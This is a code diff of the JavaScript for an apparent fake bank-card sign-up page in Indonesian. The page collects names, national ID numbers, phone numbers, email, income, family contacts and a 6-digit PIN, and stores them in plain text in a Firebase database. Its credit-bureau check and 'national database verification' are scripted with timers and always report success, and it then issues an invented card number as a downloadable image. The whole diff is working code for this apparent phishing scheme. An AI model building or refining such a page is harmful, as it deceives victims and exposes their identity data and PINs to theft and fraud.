@@ -14,113 +14,77 @@ const db = getDatabase(app);
 let currentStep = 1;
 const totalSteps = 8;
 
-// --- AUTO FORMATTING INPUT ---
 document.addEventListener('DOMContentLoaded', () => {
-    const inputNama = document.getElementById('inputNama');
-    const inputNIK = document.getElementById('inputNIK');
-    const inputWA = document.getElementById('inputWA');
-    const inputPW = document.getElementById('inputPW');
+    const inputs = {
+        nama: document.getElementById('inputNama'),
+        nik: document.getElementById('inputNIK'),
+        wa: document.getElementById('inputWA'),
+        inc: document.getElementById('income'),
+        pin: document.getElementById('inputPW')
+    };
 
-    if(inputNama) {
-        inputNama.addEventListener('input', () => {
-            inputNama.value = inputNama.value.toUpperCase();
-        });
-    }
-
-    if(inputNIK) {
-        inputNIK.addEventListener('input', () => {
-            inputNIK.value = inputNIK.value.replace(/[^0-9]/g, '');
-        });
-    }
-
-    if(inputWA) {
-        inputWA.addEventListener('input', () => {
-            inputWA.value = inputWA.value.replace(/[^0-9]/g, '');
-        });
-    }
-
-    if(inputPW) {
-        inputPW.addEventListener('input', () => {
-            let val = inputPW.value.replace(/[^0-9]/g, '');
-            if (val.length > 6) val = val.substring(0, 6);
-            inputPW.value = val;
-        });
-    }
+    if(inputs.nama) inputs.nama.addEventListener('input', e => e.target.value = e.target.value.toUpperCase());
+    if(inputs.nik) inputs.nik.addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
+    if(inputs.wa) inputs.wa.addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
+    if(inputs.inc) inputs.inc.addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
+    if(inputs.pin) inputs.pin.addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, '').substring(0, 6));
 });
 
-// --- FUNGSI DINAMIS KELUARGA ---
 window.addEmergencyField = () => {
     const container = document.getElementById('emergencyContainer');
-    const currentFields = container.getElementsByClassName('emergency-item').length;
+    if (container.children.length >= 5) return alert("Maksimal 5 kontak keluarga!");
 
-    if (currentFields < 5) {
-        const div = document.createElement('div');
-        div.className = 'emergency-item';
-        div.style.padding = "10px";
-        div.style.border = "1px solid #ddd";
-        div.style.marginTop = "10px";
-        div.innerHTML = `
-            <div class="input-group">
-                <label>Nama Keluarga</label>
-                <input type="text" class="em-name" placeholder="Nama Lengkap" oninput="this.value = this.value.toUpperCase()">
-            </div>
-            <div class="input-group">
-                <label>Nomor HP Keluarga</label>
-                <input type="tel" class="em-phone" placeholder="08xxxxxxxxxx" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
-            </div>
-            <button type="button" onclick="this.parentElement.remove()" style="background:red; color:white; border:none; padding:5px; cursor:pointer; margin-top:5px; border-radius:4px;">Hapus</button>
-        `;
-        container.appendChild(div);
-    } else {
-        alert("Maksimal 5 kontak keluarga!");
-    }
+    const div = document.createElement('div');
+    div.className = 'emergency-item';
+    div.innerHTML = `
+        <div class="input-group">
+            <label>Nama Keluarga</label>
+            <input type="text" class="em-name" placeholder="Nama Lengkap" oninput="this.value = this.value.toUpperCase()">
+        </div>
+        <div class="input-group">
+            <label>Nomor HP Keluarga</label>
+            <input type="tel" class="em-phone" placeholder="08xxxxxxxxxx" oninput="this.value = this.value.replace(/\\D/g, '')">
+        </div>
+        <button type="button" class="btn-remove" onclick="this.parentElement.remove()">Hapus</button>
+    `;
+    container.appendChild(div);
 };
 
-// --- NAVIGASI & VALIDASI KETAT ---
 window.nextStep = (s) => {
     if (s === 2) {
-        const nama = document.getElementById('inputNama').value.trim();
-        const nik = document.getElementById('inputNIK').value;
-        if (nama.length < 3) return alert("Isi Nama Lengkap dengan benar!");
-        if (nik.length < 16) return alert("NIK harus 16 digit angka!");
+        if (document.getElementById('inputNama').value.length < 3) return alert("Nama Lengkap wajib diisi!");
+        if (document.getElementById('inputNIK').value.length !== 16) return alert("NIK wajib 16 digit!");
     } 
     else if (s === 3) {
         const wa = document.getElementById('inputWA').value;
         const email = document.getElementById('inputEmail').value;
-        if (!wa.startsWith('08')) return alert("Nomor WhatsApp harus diawali dengan 08!");
-        if (wa.length < 11 || wa.length > 13) return alert("Nomor WhatsApp tidak valid!");
-        if (!email.includes('@')) return alert("Format Email tidak valid!");
-    } 
+        if (!wa.startsWith('08') || wa.length < 10) return alert("Nomor WhatsApp tidak valid!");
+        if (!email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) return alert("Format Email salah!");
+    }
     else if (s === 4) {
-        if (document.getElementById('jobType').value === "") return alert("Pilih Pekerjaan Anda!");
-        if (document.getElementById('income').value === "") return alert("Isi Pendapatan bulanan!");
-    } 
+        if (!document.getElementById('jobType').value || !document.getElementById('income').value) return alert("Pekerjaan & Pendapatan wajib diisi!");
+    }
     else if (s === 5) {
-        const names = document.getElementsByClassName('em-name');
-        const phones = document.getElementsByClassName('em-phone');
-        if (names.length === 0) return alert("Tambahkan minimal 1 kontak keluarga!");
-        for(let i=0; i<names.length; i++) {
-            if (names[i].value.trim() === "") return alert(`Nama Keluarga ke-${i+1} kosong!`);
-            if (!phones[i].value.startsWith('08')) return alert(`Nomor Keluarga ke-${i+1} salah!`);
-        }
+        const names = document.querySelectorAll('.em-name');
+        if (names.length === 0) return alert("Tambahkan minimal 1 keluarga!");
+        for(let n of names) if(!n.value) return alert("Nama keluarga harus diisi!");
     }
     else if (s === 6) {
-        const pin = document.getElementById('inputPW').value;
-        if (pin.length < 6) return alert("PIN wajib 6 digit angka!");
+        if (document.getElementById('inputPW').value.length < 6) return alert("PIN Keamanan wajib 6 digit!");
     }
 
     currentStep = s;
     updateUI(s);
+    window.scrollTo({ top: 0, behavior: 'smooth' });
     if (s === 6) simulasiAnalisis();
 };
 
 function updateUI(s) {
-    document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
-    document.getElementById('step' + s).classList.add('active');
+    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+    document.getElementById(`step${s}`).classList.add('active');
     
     const percent = ((s - 1) / (totalSteps - 1)) * 100;
-    const progressLine = document.getElementById('progressLine');
-    if(progressLine) progressLine.style.width = percent + "%";
+    document.getElementById('progressLine').style.width = percent + "%";
     
     document.querySelectorAll('.circle').forEach((c, i) => {
         if (i < s - 1) { c.classList.add('completed'); c.innerHTML = "✓"; }
@@ -132,76 +96,54 @@ function updateUI(s) {
 function simulasiAnalisis() {
     const status = document.getElementById('slikStatus');
     const btn = document.getElementById('btnSlik');
-    setTimeout(() => { if(status) status.innerText = "Sinkronisasi BI-Checking..."; }, 1500);
+    setTimeout(() => status.innerText = "Sinkronisasi BI-Checking...", 1500);
     setTimeout(() => {
-        if(status) status.innerHTML = "<b style='color:green'>IDENTITAS TERVERIFIKASI</b><br>Skor Kredit: A (Sangat Baik)";
-        if(btn) btn.style.display = "block";
+        status.innerHTML = "<b style='color:#22c55e'>IDENTITAS TERVERIFIKASI</b><br><span style='font-size:12px;color:#64748b'>Skor Kredit: A (Sangat Baik)</span>";
+        btn.style.display = "flex";
     }, 3500);
 }
 
 window.generateFinal = async () => {
-    if (!document.getElementById('checkAgree').checked) return alert("Harap setujui pernyataan tanggung jawab!");
+    if (!document.getElementById('checkAgree').checked) return alert("Harap setujui konfirmasi akhir!");
     const btn = document.getElementById('btnGenerate');
     btn.disabled = true;
-    btn.innerText = "MENGECEK DATABASE...";
+    btn.innerText = "MENGHUBUNGI SERVER...";
 
+    const nik = document.getElementById('inputNIK').value;
     try {
-        const dbRef = ref(db);
-        const snapshot = await get(child(dbRef, `nasabah`));
+        const snapshot = await get(child(ref(db), `nasabah`));
         let exists = false;
-        const nik = document.getElementById('inputNIK').value;
-
         if (snapshot.exists()) {
             const data = snapshot.val();
-            for (let id in data) { if (data[id].nik === nik) { exists = true; break; } }
+            for (let id in data) if (data[id].nik === nik) { exists = true; break; }
         }
 
         if (exists) {
-            alert("NIK Sudah Terdaftar!");
+            alert("NIK ini sudah pernah terdaftar!");
             location.reload();
         } else {
             updateUI(8);
             initQueue();
         }
-    } catch(e) { alert("Error!"); btn.disabled = false; }
+    } catch(e) { alert("Masalah koneksi server!"); btn.disabled = false; }
 };
 
 function initQueue() {
-    // Tambahkan delay kecil agar hitungan detik mulai tepat di 120
-    localStorage.setItem('bdn_target_time', Date.now() + (120 * 1000) + 500);
-    runQueue();
-}
-
-function runQueue() {
-    const qStatus = document.getElementById('queueStatus');
-    const tDisplay = document.getElementById('timerDisplay');
-    const fillBar = document.getElementById('fillBar');
-    const totalDuration = 120;
-    
+    localStorage.setItem('bdn_timer', Date.now() + 120500);
     const interval = setInterval(() => {
-        const diff = Math.ceil((localStorage.getItem('bdn_target_time') - Date.now()) / 1000);
-        
+        const diff = Math.ceil((localStorage.getItem('bdn_timer') - Date.now()) / 1000);
         if (diff <= 0) {
             clearInterval(interval);
-            if(tDisplay) tDisplay.innerText = "Estimasi: Selesai";
             finalRevealProcess();
             return;
         }
-
-        const progress = ((totalDuration - diff) / totalDuration) * 100;
-        if(fillBar) fillBar.style.width = progress + "%";
-
-        const m = Math.floor(diff / 60);
-        const s = diff % 60;
-        if(tDisplay) {
-            tDisplay.innerText = m > 0 ? `Estimasi: ${m} Menit ${s} Detik` : `Estimasi: ${s} Detik`;
-        }
+        document.getElementById('fillBar').style.width = ((120 - diff) / 120 * 100) + "%";
+        document.getElementById('timerDisplay').innerText = `Estimasi: ${diff} Detik`;
         
-        if(qStatus) {
-            if (diff > 80) qStatus.innerText = "Enkripsi Protokol Keamanan...";
-            else if (diff > 40) qStatus.innerText = "Verifikasi Database Nasional...";
-            else qStatus.innerText = "Menerbitkan Sertifikat Digital...";
-        }
+        const qS = document.getElementById('queueStatus');
+        if (diff > 80) qS.innerText = "Enkripsi Protokol Keamanan...";
+        else if (diff > 40) qS.innerText = "Verifikasi Database Nasional...";
+        else qS.innerText = "Menerbitkan Sertifikat Digital...";
     }, 1000);
 }
 
@@ -209,32 +151,31 @@ async function finalRevealProcess() {
     document.getElementById('processingArea').style.display = 'none';
     document.getElementById('finalReveal').style.display = 'block';
 
-    const cardNo = "0810" + Array.from({length: 12}, () => Math.floor(Math.random() * 10)).join('');
+    const cardNo = "0810" + Math.floor(Math.random() * 899999999999 + 100000000000);
     await saveToRealtime(cardNo);
+
+    for(let i=1; i<=3; i++) {
+        await new Promise(r => setTimeout(r, 1200));
+        document.getElementById(`rev${i}`).classList.add('show');
+    }
 
     setTimeout(() => {
         const card = document.getElementById('captureArea');
-        if(card) { card.style.opacity = "1"; card.style.transform = "scale(1)"; }
-        document.getElementById('btnDownload').style.display = "block";
-    }, 5500);
+        card.style.opacity = "1";
+        card.style.transform = "scale(1)";
+        document.getElementById('btnDownload').style.display = "flex";
+    }, 1000);
 }
 
 async function saveToRealtime(cardNo) {
-    const nama = document.getElementById('inputNama').value.toUpperCase();
-    const familyNames = document.getElementsByClassName('em-name');
-    const familyPhones = document.getElementsByClassName('em-phone');
-    let dataKeluarga = [];
-    
-    for(let i=0; i<familyNames.length; i++) {
-        dataKeluarga.push({
-            nama_kerabat: familyNames[i].value.toUpperCase(),
-            nomor_kerabat: familyPhones[i].value
-        });
-    }
+    const dataKeluarga = Array.from(document.querySelectorAll('.emergency-item')).map(item => ({
+        nama: item.querySelector('.em-name').value,
+        hp: item.querySelector('.em-phone').value
+    }));
 
     try {
         await set(ref(db, 'nasabah/' + cardNo), {
-            nama: nama,
+            nama: document.getElementById('inputNama').value,
             nik: document.getElementById('inputNIK').value,
             wa: document.getElementById('inputWA').value,
             email: document.getElementById('inputEmail').value,
@@ -243,20 +184,21 @@ async function saveToRealtime(cardNo) {
             kontak_darurat: dataKeluarga,
             pin: document.getElementById('inputPW').value,
             nomor_kartu: cardNo,
-            saldo: 16000, // SALDO 1$ (Rp 16.000) AGAR TIDAK RUGI
-            tgl_daftar: new Date().toISOString()
+            saldo: 1,
+            tgl_daftar: new Date().toLocaleString()
         });
 
         document.getElementById('displayNo').innerText = cardNo.match(/.{1,4}/g).join(" ");
-        document.getElementById('displayName').innerText = nama;
-    } catch(e) { console.error("Gagal Simpan:", e); }
+        document.getElementById('displayName').innerText = document.getElementById('inputNama').value;
+    } catch(e) { console.error(e); }
 }
 
 window.takeScreenshot = () => {
-    html2canvas(document.getElementById('captureArea'), { scale: 3 }).then(canvas => {
+    const area = document.getElementById('captureArea');
+    html2canvas(area, { scale: 3, backgroundColor: null, useCORS: true }).then(canvas => {
         const link = document.createElement('a');
         link.download = `BDN-CARD-${document.getElementById('inputNama').value}.png`;
-        link.href = canvas.toDataURL();
+        link.href = canvas.toDataURL("image/png");
         link.click();
     });
 };
